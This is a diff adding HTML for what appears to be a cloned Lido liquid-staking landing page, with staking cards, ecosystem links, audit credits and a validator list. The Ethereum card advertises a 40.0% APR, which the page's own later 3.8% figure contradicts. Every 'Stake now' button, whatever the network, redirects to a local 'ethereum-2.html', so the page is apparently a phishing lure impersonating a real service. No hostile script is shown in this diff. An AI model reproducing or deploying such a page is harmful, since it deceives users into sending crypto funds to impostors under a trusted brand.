+                  <div class="styles__DataWrapper-sc-12xohiw-4 jYoCaB">
+                     <div class="styles__Block-sc-12xohiw-5 wyYNR">
+                        <span data-testid="apr" class="styles__Data-sc-12xohiw-7 giNXYP">40.0%</span>
+                        <p class="styles__Label-sc-12xohiw-8 eyWNpW">APR</p>
+                     </div>
+                     <div class="styles__Line-sc-12xohiw-9 ijWhnM"></div>
+                     <div class="styles__Block-sc-12xohiw-5 wyYNR">
+                        <span data-testid="staked" class="styles__Data-sc-12xohiw-7 gnYoVZ">$7,656,749,731</span>
+                        <p class="styles__Label-sc-12xohiw-8 eyWNpW">Staked</p>
+                     </div>
+                  </div>
+                  <div class="styles__LinksContainer-sc-12xohiw-10 hrwgTK"><a style="color: #FFF;" id onClick="location.href='ethereum-2.html'" class="link__Link-sc-ezp11x-0 styles__LinkWrapper-sc-12xohiw-11 kRRDIg csoUfN">Stake now</a></div>
+               </div>
+			   <div data-testid="solana-card" class="styles__Wrapper-sc-12xohiw-0 duDKau styles__Card-sc-1s3j5eu-3 biCSLS"><img src="fonts/solana-logo-v2.svg" class="styles__Logo-sc-12xohiw-1 kSeIUp"><h2 class="styles__Title-sc-12xohiw-2 fanyYA">Solana</h2><p class="styles__Description-sc-12xohiw-3 hUONZD">Stake your SOL and receive stSOL. Use your stSOL to earn additional yields and put your staked SOL to work across the Solana ecosystem.</p><div class="styles__DataWrapper-sc-12xohiw-4 jYoCaB"><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="apr" class="styles__Data-sc-12xohiw-8 fhgDjQ">6.7%</span><div class="styles__FlexAprContainer-sc-12xohiw-5 jtuMGk"><p class="styles__Label-sc-12xohiw-9 gXpGoq">APR</p></div></div><div class="styles__Line-sc-12xohiw-10 hcmNw"></div><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="staked" class="styles__Data-sc-12xohiw-8 eYVjAy">$42,321,541</span><p class="styles__Label-sc-12xohiw-9 gXpGoq">Staked</p></div></div><div class="styles__LinksContainer-sc-12xohiw-11 jGYXAr"><a href="#" onClick="location.href='ethereum-2.html'" style="color:white;" class="link__Link-sc-jfkg75-0 styles__LinkWrapper-sc-12xohiw-12 kbzXlF gkzqkG">Stake now</a></div></div>
+			   <div data-testid="polygon-card" class="styles__Wrapper-sc-12xohiw-0 duDKau styles__Card-sc-1s3j5eu-3 biCSLS"><img src="fonts/polygon-logo.svg" class="styles__Logo-sc-12xohiw-1 kSeIUp"><h2 class="styles__Title-sc-12xohiw-2 fanyYA">Polygon</h2><p class="styles__Description-sc-12xohiw-3 hUONZD">Stake MATIC tokens to support network decentralisation and watch your stMATIC value grow. Staking does not mean locking anymore.</p><div class="styles__DataWrapper-sc-12xohiw-4 jYoCaB"><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="apr" class="styles__Data-sc-12xohiw-8 fhgDjQ">6.3%</span><div class="styles__FlexAprContainer-sc-12xohiw-5 jtuMGk"><p class="styles__Label-sc-12xohiw-9 gXpGoq">APR</p></div></div><div class="styles__Line-sc-12xohiw-10 hcmNw"></div><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="staked" class="styles__Data-sc-12xohiw-8 eYVjAy">$46,584,688</span><p class="styles__Label-sc-12xohiw-9 gXpGoq">Staked</p></div></div><div class="styles__LinksContainer-sc-12xohiw-11 jGYXAr"><a onClick="location.href='ethereum-2.html'" style="color:white;" class="link__Link-sc-jfkg75-0 styles__LinkWrapper-sc-12xohiw-12 kbzXlF gkzqkG">Stake now</a></div></div>
+			   <div data-testid="polkadot-card" class="styles__Wrapper-sc-12xohiw-0 duDKau styles__Card-sc-1s3j5eu-3 biCSLS"><img src="fonts/polkadot-logo.svg" class="styles__Logo-sc-12xohiw-1 kSeIUp"><h2 class="styles__Title-sc-12xohiw-2 fanyYA">Polkadot</h2><p class="styles__Description-sc-12xohiw-3 hUONZD">Stake your DOT and receive stDOT. Yield daily staking rewards and put your stDOT to DeFi to work across the Polkadot and Moonbeam ecosystems.</p><div class="styles__DataWrapper-sc-12xohiw-4 jYoCaB"><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="apr" class="styles__Data-sc-12xohiw-8 fhgDjQ">13.3%</span><div class="styles__FlexAprContainer-sc-12xohiw-5 jtuMGk"><p class="styles__Label-sc-12xohiw-9 gXpGoq">APR</p></div></div><div class="styles__Line-sc-12xohiw-10 hcmNw"></div><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="staked" class="styles__Data-sc-12xohiw-8 eYVjAy">$13,521,309</span><p class="styles__Label-sc-12xohiw-9 gXpGoq">Staked</p></div></div><div class="styles__LinksContainer-sc-12xohiw-11 jGYXAr"><a onClick="location.href='ethereum-2.html'" style="color:white;" class="link__Link-sc-jfkg75-0 styles__LinkWrapper-sc-12xohiw-12 kbzXlF gkzqkG">Stake now</a></div></div>
+			   <div data-testid="kusama-card" class="styles__Wrapper-sc-12xohiw-0 duDKau styles__Card-sc-1s3j5eu-3 biCSLS"><img src="fonts/kusama-logo.svg" class="styles__Logo-sc-12xohiw-1 kSeIUp"><h2 class="styles__Title-sc-12xohiw-2 fanyYA">Kusama</h2><p class="styles__Description-sc-12xohiw-3 hUONZD">Stake your KSM and receive stKSM. Yield daily staking rewards and put your stKSM to DeFi to work across the Kusama and Moonriver ecosystems.</p><div class="styles__DataWrapper-sc-12xohiw-4 jYoCaB"><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="apr" class="styles__Data-sc-12xohiw-8 fhgDjQ">7.6%</span><div class="styles__FlexAprContainer-sc-12xohiw-5 jtuMGk"><p class="styles__Label-sc-12xohiw-9 gXpGoq">APR</p></div></div><div class="styles__Line-sc-12xohiw-10 hcmNw"></div><div class="styles__Block-sc-12xohiw-6 bYMlBi"><span data-testid="staked" class="styles__Data-sc-12xohiw-8 eYVjAy">$2,059,333</span><p class="styles__Label-sc-12xohiw-9 gXpGoq">Staked</p></div></div><div class="styles__LinksContainer-sc-12xohiw-11 jGYXAr"><a onClick="location.href='ethereum-2.html'" style="color:white;" class="link__Link-sc-jfkg75-0 styles__LinkWrapper-sc-12xohiw-12 kbzXlF gkzqkG">Stake now</a></div></div>
+            </div>
+         </div>
+         <div class="styles__Beach1Wrapper-sc-1s3j5eu-4 cqkkEW"><img src="fonts/beach-1.svg" class="styles__Beach1-sc-1s3j5eu-5 ilMGEJ"><img src="fonts/stone-1.svg" class="styles__Stone1-sc-1s3j5eu-6 bbGomR"><img src="fonts/stone-2.svg" class="styles__Stone2-sc-1s3j5eu-7 cVumuu"></div>
+         <div class="styles__Beach2Wrapper-sc-1s3j5eu-8 hMfJYU"><img src="fonts/beach-2.svg" class="styles__Beach2-sc-1s3j5eu-9 cNUmHy"></div>
+         <div class="styles__Plants-sc-1s3j5eu-10 gyekEr"><img src="fonts/plant-1.svg" class="styles__Plant1-sc-1s3j5eu-11 iMyVmY"><img src="fonts/plant-2.svg" class="styles__Plant2-sc-1s3j5eu-12 iFFabF"></div>
+      </section>
+      <section id="how-it-works" class="styles__Wrapper-sc-15cy5wd-0 hStuhO">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-15cy5wd-1 kLbMom">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">How Lido works</h2>
+            <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Lido builds state of the art liquid staking protocols to grow the staking economy</p>
+            <div class="styles__Cards-sc-15cy5wd-2 hmmBaP">
+               <div class="styles__Wrapper-sc-1e149i9-0 dfXqFS styles__CardWrapper-sc-15cy5wd-3 fikbhC">
+                  <div class="styles__IconWrapper-sc-1e149i9-1 fdRbLp">
+                     <svg height="44" width="44">
+                        <use xlink:href="#stake-1"/>
+                     </svg>
+                  </div>
+                  <h2 class="styles__Title-sc-1e149i9-2 kCSBjB">Stake</h2>
+                  <p class="styles__Description-sc-1e149i9-3 hwTaJC">Lido lets users stake their assets for daily staking rewards. User can stake any amount of tokens - no minimum.</p>
+               </div>
+               <div class="styles__Wrapper-sc-1e149i9-0 dfXqFS styles__CardWrapper-sc-15cy5wd-3 fikbhC">
+                  <div class="styles__IconWrapper-sc-1e149i9-1 fdRbLp">
+                     <svg height="44" width="44">
+                        <use xlink:href="#mint"/>
+                     </svg>
+                  </div>
+                  <h2 class="styles__Title-sc-1e149i9-2 kCSBjB">Mint</h2>
+                  <p class="styles__Description-sc-1e149i9-3 hwTaJC">When staking Lido you mint staked tokens which are issued 1:1 to your initial stake. Your staked tokens can be used across the DeFi ecosystem to compound your yield.</p>
+               </div>
+               <div class="styles__Wrapper-sc-1e149i9-0 dfXqFS styles__CardWrapper-sc-15cy5wd-3 fikbhC">
+                  <div class="styles__IconWrapper-sc-1e149i9-1 fdRbLp">
+                     <svg height="44" width="44">
+                        <use xlink:href="#defi-2"/>
+                     </svg>
+                  </div>
+                  <h2 class="styles__Title-sc-1e149i9-2 kCSBjB">DeFi</h2>
+                  <p class="styles__Description-sc-1e149i9-3 hwTaJC">Lido lets you use your staked assets to gain yield on top of yield. Use your tokens (which earn daily staking rewards) as collateral, for lending, yield farming and more.</p>
+               </div>
+               <div class="styles__Wrapper-sc-1e149i9-0 dfXqFS styles__CardWrapper-sc-15cy5wd-3 fikbhC">
+                  <div class="styles__IconWrapper-sc-1e149i9-1 fdRbLp">
+                     <svg height="44" width="44">
+                        <use xlink:href="#community"/>
+                     </svg>
+                  </div>
+                  <h2 class="styles__Title-sc-1e149i9-2 kCSBjB">Community</h2>
+                  <p class="styles__Description-sc-1e149i9-3 hwTaJC">Lido DAO is a community that builds liquid staking services and governs the direction of Lido. The number of DAO participants is growing daily with contributors working together to build the future of Lido.</p>
+               </div>
+            </div>
+            <div class="styles__Banner-sc-15cy5wd-4 hobgQU">
+               <h2 class="Title-sc-7b4eon-0 styles__TitleBanner-sc-15cy5wd-5 gdTrKl eAMrGc">The Lido DAO</h2>
+               <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">The Lido DAO governs Lido’s liquid staking protocols. <br class="styles__Br-sc-15cy5wd-6 ecCAtG">Check out our primer to learn more and get in touch to join the community.</p>
+               <div class="styles__Links-sc-15cy5wd-9 eyrXcy"><a href="static/Lido_Ethereum-Liquid-Staking.html" target="_blank" width="280" class="link__Link-sc-ezp11x-0 styles__LinkWrapper-sc-15cy5wd-7 dgHTFV etnOvZ">Read primer</a><a href="https://operatorportal.lido.fi/apply-to-be-a-lido-node-operator" target="_blank" width="280" class="link__Link-sc-ezp11x-0 transparent-link__TransparentLink-sc-od18kl-0 styles__TransparentLinkWrapper-sc-15cy5wd-8 dgHTFV irXrUp">Apply to be a Node Operator</a></div>
+            </div>
+         </div>
+      </section>
+      <section id="ecosystem" class="styles__Wrapper-sc-1yub08y-0 beuCXH">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-1yub08y-1 hvuXqT">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">A growing Lido ecosystem</h2>
+            <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Lido empowers stakers to put their staked assets to use. Explore apps and services integrated with Lido.</p>
+            <div class="styles__Cards-sc-1yub08y-2 cGnmiC">
+               <a href="https://stake.lido.fi/" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/stake-ether.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">Stake Ether</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">Stake your ETH to receive daily staking rewards</p>
+                  </div>
+               </a>
+               <a href="https://www.curve.fi/steth" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/curve.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">Curve</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">Exchange liquidity pool on Ethereum designed for efficient stablecoin trading</p>
+                  </div>
+               </a>
+               <a href="https://oasis.app/vaults/open-multiply/WSTETH-A" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/maker-dao.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">MakerDao</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">MakerDAO lets you use your digital tokens as collateral for loans</p>
+                  </div>
+               </a>
+               <a href="https://blog.lido.fi/aave-integrates-lidos-steth-as-collateral/" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/aave.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">AAVE</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">Aave is an open-source protocol to earn interest on deposits and borrow assets</p>
+                  </div>
+               </a>
+               <a href="https://www.ledger.com/" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/ledger-logo.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">Ledger</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">Stake with Lido from the security of your Ledger wallet</p>
+                  </div>
+               </a>
+               <a href="https://app.sushi.com/farm" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/sushi-swap-onsen.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">SushiSwap Onsen</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">SushiSwap Onsen lets users stake their tokens for daily liquidity rewards</p>
+                  </div>
+               </a>
+               <a href="https://1inch.exchange/" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/1-inch.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">1inch</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">DEX agregator sourcing the best prices across the market</p>
+                  </div>
+               </a>
+               <a href="https://ftx.com/trade/STETH/USD" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 YFkdC iDWInh styles__CardWrapper-sc-1yub08y-3 eXVmHE" target="_blank" rel="nofollow noopener">
+                  <img src="fonts/ftx.svg" class="styles__Logo-sc-xskwrq-0 fXBbhQ">
+                  <div class="styles__Block-sc-xskwrq-1 dOeMHA">
+                     <h2 class="styles__Title-sc-xskwrq-2 kaYJQn">FTX</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">A licensed cryptocurrency exchange</p>
+                  </div>
+               </a>
+               <a href="lido-ecosystem.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-xskwrq-4 ecosystem-card__Wrapper-sc-2jsmwo-0 YFkdC iDWInh eNyZwm">
+                  <div class="styles__Block-sc-xskwrq-1 ecosystem-card__StyledBlock-sc-2jsmwo-1 dOeMHA eXCEJI">
+                     <h2 class="styles__Title-sc-xskwrq-2 ecosystem-card__StyledTitle-sc-2jsmwo-2 kaYJQn dhaRKT">26</h2>
+                     <p class="styles__Description-sc-xskwrq-3 eqxPS">ecosystem applications</p>
+                  </div>
+                  <span class="ecosystem-card__ViewAll-sc-2jsmwo-3 cnnNAw">View all</span>
+               </a>
+            </div>
+         </div>
+      </section>
+      <section class="styles__Wrapper-sc-16ljhqj-0 jfveWG">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-16ljhqj-1 IVgAA">
+            <h2 color="#ffffff" class="Title-sc-7b4eon-0 jZYFyy">Audits</h2>
+            <p color="#ffffff" class="Description-sc-u8z3wb-0 dGvuaA">Lido has been audited by the industry-leaders in blockchain security.</p>
+            <div class="styles__Rows-sc-16ljhqj-2 grlKzy">
+               <div class="styles__Row-sc-16ljhqj-3 fNitNa">
+                  <div class="styles__ImageWrapper-sc-16ljhqj-4 gLLeoq"><img src="fonts/logo-1.svg" height="33" class="styles__Image-sc-16ljhqj-5 otjmA"></div>
+                  <p class="styles__Info-sc-16ljhqj-6 gIsJMY">Quantstamp’s mission is to secure the decentralized internet, and has protected over $8B in digital asset risk from hackers. More than 170 startups, foundations and enterprises work with Quantstamp to keep their innovative products safe.</p>
+                  <a href="https://github.com/lidofinance/audits/blob/main/QSP Lido Report 12-2020.pdf" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-16ljhqj-7 YFkdC itPzN">See report</a>
+               </div>
+               <div class="styles__Row-sc-16ljhqj-3 fNitNa">
+                  <div class="styles__ImageWrapper-sc-16ljhqj-4 gLLeoq"><img src="fonts/logo-3.svg" height="23" class="styles__Image-sc-16ljhqj-5 otjmB"></div>
+                  <p class="styles__Info-sc-16ljhqj-6 gIsJMY">MixBytes is a team of experienced developers providing top-notch blockchain solutions, smart contract security audits and tech advisory</p>
+                  <a href="https://github.com/lidofinance/audits/blob/main/MixBytes ETH2 Oracle Security Audit Report 04-2021.pdf" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-16ljhqj-7 YFkdC itPzN">See report</a>
+               </div>
+               <div class="styles__Row-sc-16ljhqj-3 fNitNa">
+                  <div class="styles__ImageWrapper-sc-16ljhqj-4 gLLeoq"><img src="fonts/logo-2.svg" height="34" class="styles__Image-sc-16ljhqj-5 otjqT"></div>
+                  <p class="styles__Info-sc-16ljhqj-6 gIsJMY">Sigmaprime has an extensive background in information security, blockchain, and system design. Sigmaprime performs in-depth security assessments for decentralised systems, while also researching and developing core blockchain infrastructure.</p>
+                  <a href="https://github.com/lidofinance/audits/blob/main/Sigma Prime - Lido Finance Security Assessment Report v2.1.pdf" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-16ljhqj-7 YFkdC itPzN">See report</a>
+               </div>
+            </div>
+         </div>
+      </section>
+      <section class="styles__Wrapper-sc-ehafop-0 jLNKfQ">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-ehafop-1 nTKza">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">Validators</h2>
+            <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Explore validators that help grow Lido</p>
+            <div class="styles__Logos-sc-ehafop-2 bmLdln"><a href="https://certus.one/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-1.svg" class="styles__Logo-sc-ehafop-4 jbduxZ"></a><a href="https://p2p.org/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/p2p.svg" class="styles__Logo-sc-ehafop-4 cvbMRC"></a><a href="https://chorus.one/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-3.svg" class="styles__Logo-sc-ehafop-4 eBnMOF"></a><a href="https://stake.fish/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-4.svg" class="styles__Logo-sc-ehafop-4 dGfuRa"></a><a href="https://stakingfacilities.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-5.svg" class="styles__Logo-sc-ehafop-4 jumKiA"></a><a href="https://blockscape.network/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-6.svg" class="styles__Logo-sc-ehafop-4 cUUNSN"></a><a href="https://www.dsrvlabs.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/dsrv.svg" class="styles__Logo-sc-ehafop-4 dZgZBs"></a><a href="https://everstake.one/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-8.svg" class="styles__Logo-sc-ehafop-4 gGStze"></a><a href="https://www.kiln.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/kiln.svg" class="styles__Logo-sc-ehafop-4 emdRca"></a><a href="https://www.rockx.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-10.svg" class="styles__Logo-sc-ehafop-4 dxtrXS"></a><a href="https://figment.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-11.svg" class="styles__Logo-sc-ehafop-4 enknHo"></a><a href="https://www.allnodes.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-12.svg" class="styles__Logo-sc-ehafop-4 jtOFLr"></a><a href="https://www.anyblockanalytics.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-13.svg" class="styles__Logo-sc-ehafop-4 dmTFcC"></a><a href="https://blockdaemon.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-14.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://stakin.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/stakin.svg" class="styles__Logo-sc-ehafop-4 dmDNdK"></a><a href="https://www.chainlayer.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/validator-18.svg" class="styles__Logo-sc-ehafop-4 cyytgH"></a><a href="https://www.simply-vc.com.mt/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/simply-vc.svg" class="styles__Logo-sc-ehafop-4 dmDNdK"></a><a href="https://www.bridgetowercapital.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/bridgetower.svg" class="styles__Logo-sc-ehafop-4 gQGzFY"></a><a href="https://stakely.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/stakely-io.svg" class="styles__Logo-sc-ehafop-4 dmDNdK"></a><a href="https://infstones.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/inf-stones.svg" class="styles__Logo-sc-ehafop-4 dmDNdK"></a><a href="https://www.hashquark.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/hashquark.svg" class="styles__Logo-sc-ehafop-4 dmDNdK"></a><a href="https://consensys.net/codefi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/codefi.svg" class="styles__Logo-sc-ehafop-4 dmDNdK"></a><a href="https://sigmaprime.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/sigmaprime.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://prysmaticlabs.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/prysmatic-labs.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://chainsafe.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/chain-safe.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://nethermind.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/nethermind.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://www.kukis-global.com/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/kukis-global.svg" class="styles__Logo-sc-ehafop-4 jbduxZ"></a><a href="https://www.cryptomanufaktur.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/crypto-manufaktur.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://rocklogic.at/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/rock-logic.svg" class="styles__Logo-sc-ehafop-4 bjJkGj"></a><a href="https://www.attestant.io/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__LogoWrapper-sc-ehafop-3 YFkdC hOKdPW"><img src="fonts/attestant.svg" class="styles__Logo-sc-ehafop-4 gTrDDu"></a></div>
+            <section class="styles__Wrapper-sc-15q8ef4-0 cjBbhA">
+               <div class="styles__Sun-sc-15q8ef4-2 hQXszj"></div>
+               <div class="styles__ContentContainer-sc-15q8ef4-1 fXsgkc">
+                  <img src="fonts/node-operator-icon.svg" class="styles__Icon-sc-15q8ef4-3 jusPGG">
+                  <h3 class="styles__Title-sc-15q8ef4-4 dXPgKe">Become a Node Operator</h3>
+                  <p class="styles__Description-sc-15q8ef4-5 fQVJlG">Lido is constantly looking to grow its set of Node Operators. Find out more about the requirements, expectations, and process for applying to be a Lido Node Operator</p>
+                  <a href="https://operatorportal.lido.fi/apply-to-be-a-lido-node-operator" target="_blank" class="link__Link-sc-ezp11x-0 styles__LinkWrapper-sc-15q8ef4-6 kRRDIg gvhJgS">Join Node Operator set</a>
+               </div>
+            </section>
+         </div>
+      </section>
+      <section class="styles__Wrapper-sc-btpyxv-0 frAKKV">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-btpyxv-1 bSvOXa">
+            <div class="styles__Networks-sc-btpyxv-2 dvDauo">
+               <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">Stake with Lido</h2>
+               <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Lido provides liquid staking for the following networks:</p>
+               <div class="styles__Cards-sc-btpyxv-3 etNSSf">
+                  <div class="styles__Wrapper-sc-p67agx-0 izXyua styles__Card-sc-btpyxv-4 bQlqZY">
+                     <img src="fonts/ethereum-logo.svg" class="styles__Logo-sc-p67agx-1 klNfrg"><span class="styles__APR-sc-p67agx-2 eqlSom">3.8%</span>
+                     <p class="styles__Label-sc-p67agx-3 kKBUSr">APR</p>
